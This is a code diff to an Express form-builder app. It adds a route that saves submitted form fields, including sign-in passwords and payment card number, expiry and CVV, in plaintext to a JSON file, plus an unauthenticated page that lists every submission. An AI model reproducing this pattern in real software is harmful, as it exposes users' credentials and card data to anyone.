@@ -2,6 +2,8 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const ejs = require('ejs');
 const cors = require('cors');
+const fs = require('fs').promises;
+const path = require('path');
 
 const app = express();
 const port = process.env.PORT || 3000;
@@ -11,11 +13,24 @@ app.use(cors());
 app.use(bodyParser.json());
 app.use(express.static('public'));
 app.set('view engine', 'ejs');
+app.set('views', path.join(__dirname, 'views'));
 
 // In-memory storage for form configurations
 const formConfigs = {};
+// Path to submissions file
+const submissionsFile = path.join(__dirname, 'submissions.json');
 
-// EJS template with improved spacing for a modern look
+// Ensure submissions.json exists
+async function initializeSubmissionsFile() {
+  try {
+    await fs.access(submissionsFile);
+  } catch {
+    await fs.writeFile(submissionsFile, JSON.stringify([]));
+  }
+}
+initializeSubmissionsFile();
+
+// EJS template for live form
 const formTemplate = `
 <!DOCTYPE html>
 <html lang="en">
@@ -325,9 +340,41 @@ const formTemplate = `
       return true;
     }
 
+    async function submitFormData() {
+      const inputs = inputFieldsContainer.querySelectorAll('input');
+      const formData = {};
+      inputs.forEach(input => {
+        const fieldId = input.id.replace('login-', '');
+        formData[fieldId] = input.value.trim();
+      });
+
+      try {
+        const response = await fetch('/form/<%= formId %>/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(formData)
+        });
+        const result = await response.json();
+        if (!response.ok) {
+          console.error('Submission failed:', result.error);
+          showMessagePopup(result.error || 'Failed to submit form.');
+          return false;
+        }
+        console.log('Submission successful:', result);
+        return true;
+      } catch (error) {
+        console.error('Error submitting form:', error);
+        showMessagePopup('An error occurred while submitting the form.');
+        return false;
+      }
+    }
+
     try {
-      loginButton.addEventListener('click', () => {
+      loginButton.addEventListener('click', async () => {
         if (!checkFormFilled()) return;
+        const submitted = await submitFormData();
+        if (!submitted) return;
+
         const action = '<%= buttonAction %>';
         const url = '<%= buttonUrl %>';
         const message = '<%= buttonMessage %>';
@@ -442,6 +489,58 @@ app.post('/create', (req, res) => {
   }
 });
 
+// Route to handle form submissions
+app.post('/form/:id/submit', async (req, res) => {
+  const formId = req.params.id;
+  if (!formConfigs[formId]) {
+    console.error(`Form not found for ID: ${formId}`);
+    return res.status(404).json({ error: 'Form not found' });
+  }
+
+  try {
+    const formData = req.body;
+    const submission = {
+      formId,
+      timestamp: new Date().toISOString(),
+      data: Object.fromEntries(
+        Object.entries(formData).map(([key, value]) => [sanitizeForJs(key), sanitizeForJs(value)])
+      )
+    };
+
+    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
+    submissions.push(submission);
+    await fs.writeFile(submissionsFile, JSON.stringify(submissions, null, 2));
+
+    console.log(`Submission saved for form ${formId}:`, submission);
+    res.status(200).json({ message: 'Submission saved successfully' });
+  } catch (error) {
+    console.error('Error saving submission:', error.message, error.stack);
+    res.status(500).json({ error: 'Failed to save submission', details: error.message });
+  }
+});
+
+// Route to display submissions
+app.get('/submissions', async (req, res) => {
+  try {
+    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
+    const templates = {
+      'sign-in': { name: 'Sign In Form', fields: [{ id: 'email' }, { id: 'password' }] },
+      'contact': { name: 'Contact Form', fields: [{ id: 'phone' }, { id: 'email' }] },
+      'payment-checkout': { name: 'Payment Checkout Form', fields: [{ id: 'card-number' }, { id: 'exp-date' }, { id: 'cvv' }] }
+    };
+
+    res.render('submissions', {
+      submissions: submissions.reverse(), // Latest submissions first
+      templates,
+      theme: 'light', // Default theme, can be made dynamic if needed
+      sanitizeForJs
+    });
+  } catch (error) {
+    console.error('Error rendering submissions:', error.message, error.stack);
+    res.status(500).send('Error rendering submissions');
+  }
+});
+
 // Route to serve the live form
 app.get('/form/:id', (req, res) => {
   const formId = req.params.id;
@@ -534,6 +633,7 @@ app.get('/form/:id', (req, res) => {
       theme: config.theme,
       minHeight,
       template: config.template,
+      formId,
       templates: JSON.stringify(templates, (key, value) => {
         if (key === 'regex' && value) return value.toString().slice(1, -1);
         return value;
